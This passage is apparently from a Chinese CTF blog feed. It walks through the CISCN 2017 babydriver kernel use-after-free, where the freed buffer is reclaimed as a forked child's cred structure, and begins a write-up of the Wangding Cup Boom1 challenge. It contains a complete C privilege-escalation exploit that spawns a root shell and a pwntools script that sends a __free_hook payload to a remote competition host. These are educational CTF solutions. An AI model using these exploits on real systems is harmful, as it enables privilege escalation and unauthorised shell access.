bytes）为下一个object的指针来实现。当有chunk被<code>kfree</code>掉时，会相应的放在对应size的<code>freelist</code>头部。至于关于object的其他的各种metadata，都会维护在相应的结构体中，这里不进行深入分析。</li><li>同glibc的<code>malloc</code>类似，<code>kmalloc</code>也不会清空chunk中的原有数据。</li></ol><h2 id="cred结构体"><a href="#cred结构体" class="headerlink" title="cred结构体"></a>cred结构体</h2><p>linux-4.4.72的<code>cred</code>结构体的定义如下（其中<code>atomic_t</code>，<code>kuid_t</code>，<code>kgid_t</code>都是4 bytes的数据类型）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we're permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>cred</code>结构体的作用是储存某个进程的相关信息，标志它的权限，故如果修改了进程对应的<code>cred</code>结构体，也就修改了这个进程的权限。<br><br>因此只要将进程的<code>uid</code>和<code>gid</code>改为0，就能达到提权的目的。<br><br>此外由于<code>cred</code>结构体在不同版本的kernel里，大小可能不尽相同，如果直接看源码计算它的大小可能不太方便，因此可以通过：</p><ol><li>修改文件系统镜像<code>rootfs.cpio</code>解包出的init，将setgiduid的命令，例如： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setsid cttyhack setuidgid 1000 sh</span><br></pre></td></tr></table></figure> 修改为root用户: <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setsid cttyhack setuidgid 0 sh</span><br></pre></td></tr></table></figure> 这样内核启动完，就能以root的身份登录。</li><li>编写获取<code>cred</code>结构体大小的简单模块，打包进文件系统镜像中，如： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use for get struct cred size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cred.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">c</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">get_cred_size_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"[!] Start!\n"</span>);</span><br><span class="line">    printk(KERN_INFO <span class="string">"[+] Size of cred struct: %lx\n"</span>, <span class="keyword">sizeof</span>(c));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">get_cred_size_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"[!] Exit!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(get_cred_size_init);</span><br><span class="line">module_exit(get_cred_size_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br></pre></td></tr></table></figure> 这样在目标系统启动后，插入模块就能获得<code>cred</code>结构体的大小。</li></ol><h2 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h2><p>对于一个进程<code>fork</code>出来的子进程，由于最开始子进程会和父进程共享内存空间，只有内存中的信息要发生变化的时候，才会分配出相应的内存。因此如果父进程释放一个与<code>cred</code>结构体大小相同的chunk，子进程在创建自己的<code>cred</code>结构体的时候，会从释放的chunk中拿到内存空间，这就促使了uaf的利用。</p><h1 id="ciscn-2017-babydriver复现"><a href="#ciscn-2017-babydriver复现" class="headerlink" title="ciscn 2017 babydriver复现"></a>ciscn 2017 babydriver复现</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>查看保护机制：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>同时从<code>boot.sh</code>中，查看qemu的参数，开启了smep：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-cpu kvm64,+smep</span><br></pre></td></tr></table></figure><p><code>ioctl</code>只提供了一个<code>kmalloc</code>的功能，为全局变量<code>babydev_struct</code>结构体的成员变量<code>device_buf</code>分配空间（事先会调用<code>kfree</code>先释放空间），其中size可控：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">    <span class="keyword">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">    __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">    v4 = v3;</span><br><span class="line">    <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        kfree(babydev_struct.device_buf);</span><br><span class="line">        babydev_struct.device_buf = (<span class="keyword">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">        babydev_struct.device_buf_len = v4;</span><br><span class="line">        printk(<span class="string">"alloc done\n"</span>, <span class="number">0x24000C0</span>LL);</span><br><span class="line">        result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        printk(&amp;unk_2EB, v3);</span><br><span class="line">        result = <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>close</code>的回调函数<code>babyrelease</code>通过<code>kfree</code>释放了<code>babydev_struct-&gt;device_buf</code>的空间：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _fentry__(inode, filp);</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    printk(<span class="string">"device release\n"</span>, filp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>read</code>的回调函数<code>babyread</code>读取<code>babydev_struct-&gt;device_buf</code>的内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *<span class="built_in">buffer</span>, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">    <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    _fentry__(filp, <span class="built_in">buffer</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    result = <span class="number">-2L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">    &#123;</span><br><span class="line">        v6 = v4;</span><br><span class="line">        copy_to_user(<span class="built_in">buffer</span>, babydev_struct.device_buf, v4);</span><br><span class="line">        result = v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>write</code>的回调函数<code>babywrite</code>向<code>babydev_struct-&gt;device_buf</code>写入数据，size可控：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *<span class="built_in">buffer</span>, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">    <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    _fentry__(filp, <span class="built_in">buffer</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    result = <span class="number">-2L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">    &#123;</span><br><span class="line">        v6 = v4;</span><br><span class="line">        copy_from_user(babydev_struct.device_buf, (<span class="keyword">char</span> *)<span class="built_in">buffer</span>, v4);</span><br><span class="line">        result = v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>结构体<code>babydev_struct</code>是全局变量，因此如果开启两个设备，第二个设备<code>kmalloc</code>出的<code>babydev_struct-&gt;device_buf</code>指针会会覆盖掉第一个设备的<code>babydev_struct-&gt;device_buf</code>（因为实际上是同一个）。因此如果<code>close</code>第二个设备，触发<code>kfree</code>操作释放掉<code>babydev_struct-&gt;device_buf</code>但是没有清空指针，就会造成uaf漏洞，因为此时第一个设备仍然可以操作<code>babydev_struct-&gt;device_buf</code>变量。</li><li>利用<code>ioctl</code>控制<code>babydev_struct-&gt;device_buf</code>的size为0xA8(<code>sizeof(struct cred)</code>)，使得<code>close</code>第二个设备的时候释放一个<code>size=0xC0</code>的chunk到slub中。</li><li><code>fork</code>一个子进程，由于子进程创建的<code>cred</code>结构体会从上述释放的0xC0的chunk中获得，所以第一个设备的<code>babydev_struct-&gt;device_buf</code>和子进程的<code>cred</code>同时指向一个chunk。</li><li>在子进程中调用第一个设备的<code>write</code>，将子进程的<code>cred</code>结构体中的<code>uid</code>和<code>gid</code>改为0，完成提权。</li><li>在子进程开启shell，get root shell。</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COM_MALLOC 0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd_1, fd_2;</span><br><span class="line">    <span class="keyword">int</span> child;</span><br><span class="line">    <span class="keyword">char</span> payload[<span class="number">16</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// open the device twice</span></span><br><span class="line">    fd_1 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line">    fd_2 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// malloc a chunk with sizeof(struct cred)</span></span><br><span class="line">    ioctl(fd_1, COM_MALLOC, <span class="number">0xA8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the chunk</span></span><br><span class="line">    <span class="built_in">close</span>(fd_1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fork a child process</span></span><br><span class="line">    <span class="comment">// the cred structure of the child process will take space from the chunk just freed</span></span><br><span class="line">    child = fork();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if error</span></span><br><span class="line">    <span class="keyword">if</span>(child &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Fork error!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// child process</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(child == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(payload, <span class="number">0</span>, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">        <span class="built_in">write</span>(fd_2, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[+] Root!\n"</span>);</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// parent process</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(fd_2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>与glibc的uaf利用基本类似，只不过因为是kernel pwn，要具有多线程的思维，这点很重要，因为许多情况在单线程思维的角度中是不会发生的，但是多线程下却是可能的。</li><li>相比于调用<code>commit_creds(prepare_kernel_cred(0));</code>的函数调用的提权方式，直接修改<code>cred</code>结构体提权显得简单粗暴。</li><li>这道babydriver的题似乎还有rop绕过smep的做法，后面浮现后，会补充在上篇ROP的文章里。</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://www.anquanke.com/post/id/201454" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201454</a></li><li><a href="https://www.anquanke.com/post/id/202371" target="_blank" rel="noopener">https://www.anquanke.com/post/id/202371</a></li><li><a href="https://www.anquanke.com/post/id/201043" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201043</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_uaf-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_uaf-zh/</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;因为课程作业里接触到了uaf的kernel pwn，虽然比较基础，但是还是有那么点基础，理解起来不会很吃力。这次复现的是CISCN 2017的一个kernel pwn babydriver，比较简单的UAF，但是还是有一些细节知识值得学习。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Reproduction" scheme="https://n0nop.com/categories/Reproduction/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
      <category term="kernel" scheme="https://n0nop.com/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯 第一场: pwn</title>
    <link href="https://n0nop.com/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%AC%AC%E4%B8%80%E5%9C%BA-pwn/"/>
    <id>https://n0nop.com/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%AC%AC%E4%B8%80%E5%9C%BA-pwn/</id>
    <published>2020-05-11T00:58:31.000Z</published>
    <updated>2020-05-21T14:20:03.511Z</updated>
    
    <content type="html"><![CDATA[<p>兴致满满地开始比赛，骂骂咧咧地结束比赛，这个不给libc也太难受了。全程下来只做了一个Boom1，另外两个被队里TTX大哥做了。赛后看了下Boom2，也挺简单的，但是faster0是个AutoPwn，之前的De1CTF有个code runner应该也是类似的，暂且先记录一下大佬的wp，以后学习。</p><a id="more"></a><h1 id="Boom1"><a href="#Boom1" class="headerlink" title="Boom1"></a>Boom1</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>代码略长，花了点时间逆向之后发现，其实是一个VM pwn，接受类C代码，其实从binary开始分配各种text，symbol，stack等segment可以看出来点，那个sub_B70只是存一些保留字，解析8，16，10进制数，后面应该是命令分析相关的，没有深入分析了，大概的逻辑懂了就行。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>主要是利用分配的stack segment进行操作，因为<code>malloc(0x40000)</code>，会通过<code>mmap</code>在ld的位置分配内存，所以在libc版本确定的情况下，它与libc的偏移是固定的。</li><li>由于本地试了很久没有找到正确版本的libc（不给libc简直无语），后面只能利用<code>write</code>把整个libc dump下来，方法简单来说就是手动采用类似二分法来找libc基址（标志头”\x7FELF”)，找到之后直接用<code>write(1, libc_base, xxxxxx);</code>整个dump下来，然后通过查找相应的字符串得到版本信息，拉个ld本地调试就行。 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings libc | grep "GLIBC"</span><br></pre></td></tr></table></figure></li><li>后续就比较简单了，通过定义局部变量，然后通过相对偏移找到<code>_IO_list_all</code>，拿到里面存的<code>_IO_2_1_stderr_</code>的地址，从而可以得到libc的基址。</li><li>同样通过相同偏移写<code>__free_hooktem</code>，然后<code>free</code>掉libc中存”/bin/sh”字符串的那块内存拿shell。</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'182.92.73.10'</span>, <span class="number">24573</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"int main()&#123;int a; *(&amp;a - 180998) = *(&amp;a - 181591) - 3953984 + 283536; free(*(&amp;a - 181591) - 3953984 + 1625431);&#125;"</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"I'm living...\n"</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Boom2"><a href="#Boom2" class="headerlink" title="Boom2"></a>Boom2</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>其实跟Boom1感觉差不多，只不过不是接受输入高级语言，手撸binary中自定义的指令就行，指令格式也很简单，就是一个mem + reg的组织形式，利用方法与Boom1类似。</p><h2 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>通过VM 